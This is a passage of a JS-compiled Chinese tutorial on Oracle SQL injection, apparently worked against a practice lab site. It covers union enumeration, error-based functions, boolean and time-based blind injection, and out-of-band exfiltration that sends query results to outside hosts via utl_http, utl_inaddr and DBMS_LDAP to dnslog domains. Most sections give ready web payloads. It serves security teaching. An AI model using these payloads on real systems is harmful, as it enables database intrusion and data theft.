\u7684\u540d\u79f0\u540c\u7528\u6237\u540d\u79f0\u76f8\u540c\u3002\u6240\u4ee5\u5f53\u524d\u6570\u636e\u5e93\u4e3aSYSTEM"}),"\n"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u6240\u6709\u8868\u540d"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u6240\u6709\u7528\u6237\u7684\u8868\nselect distinct table_name from all_tables where owner = 'SYSTEM'\n-- \u5f53\u524d\u7528\u6237\u7684\u8868\nselect table_name from user_tables;\n-- \u5305\u62ec\u7cfb\u7edf\u8868\nselect table_name from dba_tables where owner = 'SYSTEM'; \n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223202757357",src:n(89025).A+"",width:"2190",height:"1956"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsxs)(s.strong,{children:["\u83b7\u53d6\u8868",(0,r.jsx)(s.code,{children:"USERS_QXLHLW"}),"\u7684\u5217\u540d"]})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select column_name from all_tab_columns where table_name ='USERS_QXLHLW'\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223203016136",src:n(75211).A+"",width:"2246",height:"608"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"\u83b7\u53d6\u5b57\u6bb5\u503c"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select USERNAME_LHMQBY,PASSWORD_ROVRTF from USERS_QXLHLW\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223203139865",src:n(29958).A+"",width:"2120",height:"922"})}),"\n",(0,r.jsx)(s.h2,{id:"\u62a5\u9519\u6ce8\u5165",children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,r.jsx)(s.h3,{id:"\u6982\u8ff0-2",children:"\u6982\u8ff0"}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsxs)(s.p,{children:["\u4f7f\u7528\u9776\u573a",(0,r.jsx)(s.a,{href:"http://o1.lab.aqlab.cn:81/?id=1",children:"http://o1.lab.aqlab.cn:81/?id=1"})]}),"\n"]}),"\n",(0,r.jsxs)(s.p,{children:["\u548c\u5176\u4ed6\u7684\u62a5\u9519\u6ce8\u5165\u4e00\u6837\uff0c\u5728\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u4e4b\u524d\uff0c\u9996\u5148\u8981\u786e\u5b9a\u76ee\u6807\u73af\u5883\u5728web\u9875\u9762\u4e0a\u662f\u5426\u6709\u9519\u8bef\u56de\u663e\uff0c\u901a\u5e38\u4f7f\u7528",(0,r.jsx)(s.code,{children:"order by \u5927\u6570\u5b57"}),"\uff0c\u6216\u8005\u6784\u9020\u9519\u8bef\u7684sql\u8bed\u53e5\u6765\u5224\u65ad\uff0c\u4ecb\u7ecd\u51e0\u79cd\u62a5\u9519\u6ce8\u5165\u51fd\u6570\uff0c\u5176\u4ed6payload\u4e5f\u5c31\u662f\u66ff\u6362\u5b50\u67e5\u8be2\u7684SQL\u8bed\u53e5"]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223203552839",src:n(20430).A+"",width:"2010",height:"260"})}),"\n",(0,r.jsx)(s.h3,{id:"\u62a5\u9519\u51fd\u6570",children:"\u62a5\u9519\u51fd\u6570"}),"\n",(0,r.jsx)(s.h4,{id:"ctxsysdrithsxsn",children:"ctxsys.drithsx.sn()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select ctxsys.drithsx.sn(1,(select user from dual))\nselect ctxsys.drithsx.sn(1,(select table_name from (select t.* ,rownum as no from (select * from user_tables)t) where no between 2 and 2)) from dual; -- \u4e00\u6b21\u53ea\u80fd\u663e\u793a\u4e00\u884c\uff0c\u6240\u4ee5\u53ea\u80fd\u4e00\u6761\u4e00\u6761\u770b\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223203800201",src:n(4249).A+"",width:"1394",height:"432"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- web paylaod\nand ctxsys.drithsx.sn(1,(select user from dual)) = 1\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223204314455",src:n(83431).A+"",width:"1770",height:"386"})}),"\n",(0,r.jsx)(s.h4,{id:"xmltype",children:"XMLType()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual;\n-- web paylaod\nand (select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223204735057",src:n(55400).A+"",width:"1824",height:"456"})}),"\n",(0,r.jsx)(s.h4,{id:"dbms_xdb_versioncheckin",children:"dbms_xdb_version.checkin()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select dbms_xdb_version.checkin((select user from dual)) from dual\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223205329875",src:n(53788).A+"",width:"1468",height:"248"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- web paylaod\nand (select dbms_xdb_version.checkin((select user from dual)) from dual) is null\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223205504068",src:n(58845).A+"",width:"2294",height:"262"})}),"\n",(0,r.jsx)(s.h4,{id:"dbms_xdb_versionmakeversioned",children:"dbms_xdb_version.makeversioned()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select dbms_xdb_version.makeversioned((select user from dual)) from dual\n-- web paylaod\nand (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null\n"})}),"\n",(0,r.jsx)(s.h4,{id:"dbms_xdb_versionuncheckout",children:"dbms_xdb_version.uncheckout()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual\n-- web paylaod\nand (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null\n"})}),"\n",(0,r.jsx)(s.h4,{id:"dbms_utilitysqlid_to_sqlhash",children:"dbms_utility.sqlid_to_sqlhash()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual\n-- web payload\nand (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null\n"})}),"\n",(0,r.jsx)(s.h4,{id:"ordsysord_dicomgetmappingxpath",children:"ordsys.ord_dicom.getmappingxpath()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual\n-- web payload\nand (select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual) is null\n"})}),"\n",(0,r.jsx)(s.h4,{id:"utl_inaddr",children:"utl_inaddr.*()"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"\u51fd\u6570\u8bf4\u660e\uff1a"})}),"\n",(0,r.jsx)(s.p,{children:"\u7528\u4e8e\u53d6\u5f97\u5c40\u57df\u7f51\u6216Internet\u73af\u5883\u4e2d\u7684\u4e3b\u673a\u540d\u548cIP\u5730\u5740\u3002\uff08\u90a3\u5c82\u4e0d\u662f\u4e5f\u53ef\u4ee5\u901a\u8fc7DNSLOG\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u6ce8\u5165\u4e86\uff1f\uff09"}),"\n",(0,r.jsxs)(s.p,{children:["1\u3001",(0,r.jsx)(s.code,{children:"utl_inaddr.get_host_address"})]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u5982\u679c\u67e5\u8be2\u5931\u8d25\uff0c\u5219\u63d0\u793a\u7cfb\u7edf\u9519\u8bef\nselect utl_inaddr.get_host_address((select user from dual)) from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211223210351978",src:n(9141).A+"",width:"1520",height:"380"})}),"\n",(0,r.jsxs)(s.p,{children:["2\u3001",(0,r.jsx)(s.code,{children:"UTL_INADDR.get_host_name"})]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u5982\u679c\u67e5\u8be2\u5931\u8d25\uff0c\u5219\u63d0\u793a\u7cfb\u7edf\u9519\u8bef\nselect utl_inaddr.get_host_name((select user from dual)) from dual;\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u76f2\u6ce8",children:"\u76f2\u6ce8"}),"\n",(0,r.jsx)(s.h3,{id:"\u5e03\u5c14\u76f2\u6ce8",children:"\u5e03\u5c14\u76f2\u6ce8"}),"\n",(0,r.jsx)(s.h4,{id:"\u6982\u8ff0-3",children:"\u6982\u8ff0"}),"\n",(0,r.jsx)(s.p,{children:"Oracle \u5e03\u5c14\u76f2\u6ce8\u548cMysql\u76f2\u6ce8\u4e00\u6837\uff0c\u901a\u8fc7\u9875\u9762\u5bf9\u5e26\u5165\u6570\u636e\u5e93\u6c38\u771f/\u5047\u6761\u4ef6\u8fd4\u56de\u7684\u5185\u5bb9\u5dee\u5f02\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u5e03\u5c14\u76f2\u6ce8\u3002\u901a\u5e38\u9875\u9762\u8fd4\u56de\u5b58\u5728(true)/\u4e0d\u5b58\u5728(false)\u4e24\u4e2a\u7ed3\u679c\uff0c\u5c31\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u5b58\u5728\u5e03\u5c14\u6ce8\u5165\u4e86"}),"\n",(0,r.jsx)(s.h4,{id:"\u6ce8\u5165\u6d41\u7a0b-1",children:"\u6ce8\u5165\u6d41\u7a0b"}),"\n",(0,r.jsx)(s.p,{children:"\u6574\u4e2a\u6d41\u7a0b\u8fd8\u662f\u548cunion\u6ce8\u5165\u4e00\u6837\uff0c\u53ea\u662f\u76f2\u6ce8\u7684\u8fc7\u7a0b\u4e2d\u9700\u8981\u4e00\u4e2a\u5b57\u7b26\u4e00\u4e2a\u5b57\u7b26\u7684\u6765\u5224\u65ad\uff0c\u6bd4\u8f83\u8d39\u65f6\u8d39\u529b\uff0c\u4e00\u822c\u91c7\u7528\u5de5\u5177\u7684\u6765\u8f85\u52a9"}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"\u786e\u8ba4\u95ed\u5408\u60c5\u51b5"}),"\n",(0,r.jsx)(s.li,{children:"\u786e\u5b9a\u5b57\u6bb5\u7684\u6570\u91cf"}),"\n",(0,r.jsx)(s.li,{children:"\u786e\u5b9a\u9875\u9762\u56de\u663e\u4f4d"}),"\n",(0,r.jsx)(s.li,{children:"\u5229\u7528\u5df2\u77e5\u56de\u663e\u4f4d\u67e5\u8be2\u6570\u636e\na.\u67e5\u8be2\u6570\u636e\u5e93\u57fa\u672c\u4fe1\u606f\nb.\u7206\u5e93\u540d\nc.\u7206\u8868\u540d\nd.\u7206\u5b57\u6bb5\ne.\u67e5\u8be2\u654f\u611f\u4fe1\u606f"}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"\u5e38\u7528\u51fd\u6570",children:"\u5e38\u7528\u51fd\u6570"}),"\n",(0,r.jsx)(s.p,{children:"\u76f8\u6bd4\u4e8eunion\u6ce8\u5165\uff0c\u4e3b\u8981\u662f\u4e00\u4e9b\u5224\u65ad\u548c\u5207\u5272\u7684\u51fd\u6570"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.code,{children:"ascii()"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.code,{children:"substr()"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.code,{children:"length()"})}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.code,{children:"decode(a,b,c,d)"})," \uff1a\u5f53a=b \u8fd4\u56dec\uff0c\u5426\u5219\u8fd4\u56ded"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.code,{children:"instr(a,b)"})," \uff1a\u5982\u679cb\u5b57\u7b26\u4e32\u5b58\u5728a\u4e2d\uff0c\u8fd4\u56deb\u5728a\u4e2d\u5b58\u5728\u7684\u4f4d\u7f6e\uff0c\u5426\u5219\u8fd4\u56de0"]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"\u6ce8\u5165\u4e3e\u4f8b",children:"\u6ce8\u5165\u4e3e\u4f8b"}),"\n",(0,r.jsx)(s.p,{children:"\u8bed\u53e5\u90fd\u4e00\u6837\uff0c\u53ea\u662f\u5355\u5b57\u7b26\u5224\u65ad\uff0c\u4e3e\u51e0\u4e2a\u4f8b\u5b50\u629b\u7816\u5f15\u7389\u5427"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u63a2\u6d4b\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237"})}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect user from dual;\n-- payload\nand ascii(substr((select user from dual),1,1))>82 -- - \u6b63\u5e38\u9875\u9762\nand ascii(substr((select user from dual),1,1))>83 -- - \u4e0d\u6b63\u5e38\u9875\u9762\nand ascii(substr((select user from dual),1,1))=83 -- - \u6b63\u5e38\u9875\u9762\uff0c\u8bf4\u660e\u7b2c\u4e00\u4f4d\u662f S\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224110933740",src:n(21514).A+"",width:"2304",height:"546"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u786e\u8ba4\u6570\u636e\u5e93\u7684\u957f\u5ea6"})}),"\n",(0,r.jsx)(s.li,{children:"\u4ee5\u7b2c\u4e00\u4e2a\u6570\u636e\u5e93\u4e3a\u4f8b\u5b50\uff0c\u786e\u5b9a\u5e93\u7684\u957f\u5ea6"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1;\nselect length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 1;\n\n-- payload\nand (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) > 10 -- - \u6b63\u5e38\u9875\u9762\nand (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) > 11 -- - \u975e\u6b63\u5e38\u9875\u9762\nand (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) = 11 -- - \u6b63\u5e38\u9875\u9762\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u56e0\u6b64\u53ef\u4ee5\u786e\u5b9a\u7b2c\u4e00\u4e2a\u6570\u636e\u5e93\u957f\u5ea6\u4e3a11"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224111541217",src:n(93035).A+"",width:"2358",height:"688"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"\u786e\u8ba4\u7b2c\u4e00\u4e2a\u6570\u636e\u5e93\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26"})}),"\n"]}),"\n",(0,r.jsx)(s.p,{children:"\u5176\u4ed6\u5b57\u7b26\u4f9d\u6b21\u731c\u89e3\u5373\u53ef"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1),1,1)) from dual;\nselect ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 1),1,1)) from dual;\n\n-- payload\nand (select ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1),1,1)) from dual) = 65 -- -\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\u65f6\u95f4\u76f2\u6ce8",children:"\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,r.jsx)(s.h4,{id:"\u6982\u8ff0-4",children:"\u6982\u8ff0"}),"\n",(0,r.jsx)(s.p,{children:"\u548c\u5e03\u5c14\u76f2\u6ce8\u4e00\u6837\uff0c\u53ea\u662f\u65e0\u6cd5\u4ece\u9875\u9762\u8fd4\u56de\u7684\u60c5\u51b5\u6765\u5224\u65ad\uff0c\u53ea\u80fd\u901a\u8fc7\u54cd\u5e94\u65f6\u95f4\u8fdb\u884c\u5224\u65ad"}),"\n",(0,r.jsx)(s.p,{children:"\u6d41\u7a0b\u4e5f\u4e00\u6837"}),"\n",(0,r.jsx)(s.h4,{id:"\u5e38\u7528\u51fd\u6570-1",children:"\u5e38\u7528\u51fd\u6570"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.code,{children:"decode(a,b,c,d)"})," \uff1a\u5f53a=b \u8fd4\u56dec\uff0c\u5426\u5219\u8fd4\u56ded\uff0c\u7c7b\u4f3cmysql\u4e2d\u7684if"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.code,{children:"case...when...then...else...end"})}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.code,{children:"DBMS_PIPE.RECEIVE_MESSAGE"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.h4,{id:"dbms_pipereceive_message",children:"DBMS_PIPE.RECEIVE_MESSAGE"}),"\n",(0,r.jsxs)(s.p,{children:["Oracle\u4e3b\u8981\u662f\u4f7f\u7528",(0,r.jsx)(s.code,{children:"DBMS_PIPE.RECEIVE_MESSAGE('pipename',timeout)"}),"\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4ece\u6307\u5b9a\u7ba1\u9053\u83b7\u53d6\u6d88\u606f"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"pipename"}),"\u4e3avarchar(128)\u7684\u5b57\u7b26\u4e32\uff0c\u7528\u4ee5\u6307\u5b9a\u7ba1\u9053\u540d\u79f0\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8f93\u5165\u4efb\u610f\u503c\u5373\u53ef\u3002"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"timeout"}),"\u4e3ainteger\u7684\u53ef\u9009\u8f93\u5165\u53c2\u6570\uff0c\u7528\u6765\u6307\u5b9a\u7b49\u5f85\u65f6\u95f4\u3002"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select dbms_pipe.receive_message('aa', 5) from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224112854883",src:n(17244).A+"",width:"1196",height:"290"})}),"\n",(0,r.jsxs)(s.p,{children:["\u6709\u4e86\u5ef6\u65f6\u51fd\u6570\uff0c\u518d\u914d\u5408",(0,r.jsx)(s.code,{children:"decode"}),"\uff0c\u5c31\u548c\u5176\u4ed6\u76f2\u6ce8\u4e00\u6837\u4e86"]}),"\n",(0,r.jsx)(s.h4,{id:"\u51fd\u6570\u6ce8\u5165\u4e3e\u4f8b",children:"\u51fd\u6570\u6ce8\u5165\u4e3e\u4f8b"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"\u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect decode(ascii(substr((select user from dual),1,1)),83,dbms_pipe.receive_message('aa', 5),1) from dual;\n\n-- payload\nand decode(ascii(substr((select user from dual),1,1)),83,dbms_pipe.receive_message('aa', 5),1) is null -- - \u5ef6\u65f65\u79d2\u4ee5\u4e0a\uff0c\u8bf4\u660e\u7b2c\u4e00\u4f4d\u662f S\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224113307517",src:n(70758).A+"",width:"1956",height:"166"})}),"\n",(0,r.jsxs)(s.p,{children:["\u4e5f\u53ef\u4ee5\u4f7f\u7528",(0,r.jsx)(s.code,{children:"case...when.. then...else...end"}),"\u6765\u4ee3\u66ffdecode"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect case when (ascii(substr((select user from dual),1,1))=83) then dbms_pipe.receive_message('aa', 5) else 1 end from dual;\n\n-- payload\nand (case when (ascii(substr((select user from dual),1,1))=83) then dbms_pipe.receive_message('aa', 5) else 1 end) = 1 -- -\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224114331456",src:n(29960).A+"",width:"1948",height:"116"})}),"\n",(0,r.jsx)(s.h4,{id:"\u5b50\u67e5\u8be2\u8d85\u5927\u8868\u6784\u9020\u65f6\u95f4\u76f2\u6ce8",children:"\u5b50\u67e5\u8be2/\u8d85\u5927\u8868\u6784\u9020\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,r.jsxs)(s.p,{children:["\u65f6\u95f4\u76f2\u6ce8\u4e0d\u4e00\u5b9a\u8981\u7528",(0,r.jsx)(s.code,{children:"DBMS_PIPE.RECEIVE_MESSAGE()"}),"\u51fd\u6570\uff0c\u5f53\u5728\u8fdb\u884c\u7b1b\u5361\u5c14\u79ef\uff0c\u6216\u8005\u67e5\u8be2\u7cfb\u7edf\u8868\uff0c\u5b50\u67e5\u8be2\u5927\u8868\u7684\u65f6\u5019\u4e5f\u4f1a\u9020\u6210\u6570\u636e\u5e93\u67e5\u8be2\u65f6\u95f4\u5f88\u6162\uff0c\u6bd4\u5982\u5728\u5e03\u5c14\u76f2\u6ce8\u4e2d\u67e5\u8be2\u5f53\u524d\u7528\u6237\u6743\u9650\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u5e93\uff0c\u9700\u8981\u4e00\u4e2a\u4e00\u4e2a\u8868\u793a\u7684\u65f6\u5019\uff0c\u5728\u5b50\u67e5\u8be2\u4e2d\u53bb\u91cd\u5c31\u4f1a\u6d88\u8017\u5927\u91cf\u65f6\u95f4"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \u67e5\u8be2\u8bed\u53e5\nselect count(*) from all_objects;\nselect distinct owner from all_tables cross join session_privs;\nselect distinct owner from all_tables cross join session_privs cross join user_tables;\n\n-- payload\nand (case when (1=1) then (select distinct owner from all_tables cross join session_privs cross join user_tables) else 1 end) = 1 -- -\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224124338559",src:n(12124).A+"",width:"1994",height:"126"})}),"\n",(0,r.jsx)(s.h2,{id:"\u5e26\u5916oob\u6ce8\u5165",children:"\u5e26\u5916(OOB)\u6ce8\u5165"}),"\n",(0,r.jsx)(s.h3,{id:"\u6982\u8ff0-5",children:"\u6982\u8ff0"}),"\n",(0,r.jsx)(s.p,{children:"\u65e2\u7136\u662f\u5e26\u5916\uff0c\u5c31\u4e00\u5b9a\u9700\u8981\u7528\u6237\u53ef\u8bbf\u95ee\u7f51\u7edc\u7684\u6743\u9650"}),"\n",(0,r.jsxs)(s.p,{children:["\u5982\u679c\u6570\u636e\u957f\u5ea6\u592a\u957f\uff0c\u5982\u6570\u636e\u5e93\u7248\u672c\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u51fa\u9519\uff0c\u8fd9\u65f6\u5019\u8981\u4f7f\u7528\u5e26\u5916\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528",(0,r.jsx)(s.code,{children:"substr()"}),"\u51fd\u6570\u6765\u622a\u53d6\u5b57\u7b26\u4e32\uff0c\u6bcf\u6b21\u53d6\u51e0\u4e2a\u7279\u5b9a\u7684\u5b57\u7b26\u5373\u53ef"]}),"\n",(0,r.jsx)(s.h3,{id:"\u5229\u7528\u51fd\u6570",children:"\u5229\u7528\u51fd\u6570"}),"\n",(0,r.jsx)(s.h4,{id:"url_httprequest",children:"url_http.request()"}),"\n",(0,r.jsxs)(s.p,{children:["\u4f7f\u7528",(0,r.jsx)(s.code,{children:"||"}),"\u62fc\u63a5\u5b57\u7b26\u5916\u5e26\u51fa\u6765\uff0c\u53ef\u4ee5\u8fdc\u7a0b\u542f\u52a8",(0,r.jsx)(s.code,{children:"HTTP"}),"\u670d\u52a1\uff0c\u6216\u8005nc\u8fdc\u7a0b\u76d1\u542c\u67d0\u4e2a\u7aef\u53e3"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select utl_http.request('http://192.168.0.100:8888/?'||(select banner from v$version where banner like 'Oracle%')) from dual;\n\n-- payload\nand utl_http.request('http://ip:port/?'||(select banner from v$version where banner like 'Oracle%'))=1 -- -\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224125649485",src:n(17960).A+"",width:"1846",height:"208"})}),"\n",(0,r.jsx)(s.h4,{id:"utl_inaddrget_host_address",children:"utl_inaddr.get_host_address()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select utl_inaddr.get_host_address((select user from dual)||'.u6uhyf.dnslog.cn') from dual;\n\n-- payload\nand (select utl_inaddr.get_host_address((select user from dual)||'.u6uhyf.dnslog.cn') from dual) is not null -- -\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224134250563",src:n(31309).A+"",width:"2526",height:"310"})}),"\n",(0,r.jsx)(s.h4,{id:"sysdbms_ldapinit",children:"SYS.DBMS_LDAP.INIT()"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select SYS.DBMS_LDAP.INIT((select user from dual)||'.22j9po.dnslog.cn',80) from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20211224134227825",src:n(33868).A+"",width:"1046",height:"344"})}),"\n",(0,r.jsx)(s.h4,{id:"httpuritype",children:"HTTPURITYPE()"}),"\n",(0,r.jsx)(s.p,{children:"\u53ef\u4ee5\u4f7f\u7528http\u670d\u52a1\uff0c\u6216\u8005nc\u521b\u5efa\u76d1\u542c\uff0c\u6216\u8005dnslog\u5916\u5e26"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select HTTPURITYPE('http://127.0.0.1:8888/?'||(select user from dual)).GETCLOB() FROM DUAL;\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,r.jsx)(s.h3,{id:"oracle-xxe",children:"Oracle XXE"}),"\n",(0,r.jsxs)(s.p,{children:["\u5b9e\u9645\u4e0a\u662f",(0,r.jsx)(s.code,{children:"CVE-2014-6577"}),"\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\uff1a",(0,r.jsx)(s.code,{children:"11.2.0.3"}),"\uff0c",(0,r.jsx)(s.code,{children:"11.2.0.4"}),"\uff0c",(0,r.jsx)(s.code,{children:"12.1.0.1"})," \u548c",(0,r.jsx)(s.code,{children:"12.1.0.2"})]}),"\n",(0,r.jsxs)(s.p,{children:["Oracle XXE \u7684\u6548\u679c\u548c ",(0,r.jsx)(s.code,{children:"UTL_http"})," \u7684\u6548\u679c\u5dee\u4e0d\u591a\uff0c\u90fd\u662f\u5c06\u6570\u636e\u4f20\u8f93\u5230\u8fdc\u7aef\u670d\u52a1\u5668\u4e0a\u3002\u4f46\u662f\uff0c\u7531\u4e8e ",(0,r.jsx)(s.code,{children:"extractvalue()"})," \u51fd\u6570\u5bf9\u6240\u6709\u6570\u636e\u5e93\u7528\u6237\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u4e0d\u5b58\u5728\u6743\u9650\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u5f53\u5728\u4f4e\u6743\u9650\u6ca1\u6709UTL_http 